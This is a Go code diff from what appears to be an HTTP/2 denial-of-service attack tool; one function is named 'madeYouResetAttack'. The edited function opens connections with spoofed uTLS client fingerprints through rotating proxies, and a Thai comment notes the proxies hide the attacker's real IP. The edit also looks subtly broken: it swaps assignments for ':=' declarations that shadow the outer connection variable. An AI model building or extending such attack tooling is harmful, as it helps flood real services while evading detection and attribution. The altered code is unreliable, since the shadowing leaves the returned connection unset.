@@ -894,7 +894,6 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 func buildUTLSConn(insecureTLS bool, sni string, proxyList []string, helloID utls.ClientHelloID) func(ctx context.Context, network, addr string) (net.Conn, error) {
 	return func(ctx context.Context, network, addr string) (net.Conn, error) {
 		var conn net.Conn
-		var err error
 
 		if len(proxyList) > 0 {
 			pAddr := proxyList[mathrand.Intn(len(proxyList))]
@@ -912,14 +911,14 @@ func buildUTLSConn(insecureTLS bool, sni string, proxyList []string, helloID utl
 				if err != nil {
 					return nil, err
 				}
-				conn, err = dialer.Dial("tcp", addr)
+				conn, err := dialer.Dial("tcp", addr)
 				if err != nil {
 					return nil, err
 				}
 			} else {
 				// --- รองรับ HTTP และ HTTPS Proxy ---
 				dialer := &net.Dialer{Timeout: 15 * time.Second}
-				conn, err = dialer.DialContext(ctx, "tcp", pURL.Host)
+				conn, err := dialer.DialContext(ctx, "tcp", pURL.Host)
 				if err != nil {
 					return nil, err
 				}
@@ -959,7 +958,7 @@ func buildUTLSConn(insecureTLS bool, sni string, proxyList []string, helloID utl
 
 			/* หากต้องการกลับมาเปิดใช้งาน IP จริงในอนาคต ให้ลบบรรทัดบนแล้วเอาคอมเมนต์ส่วนนี้ออก:
 			dialer := &net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}
-			conn, err = dialer.DialContext(ctx, network, addr)
+			conn, err := dialer.DialContext(ctx, network, addr)
 			if err != nil {
 				return nil, err
 			}
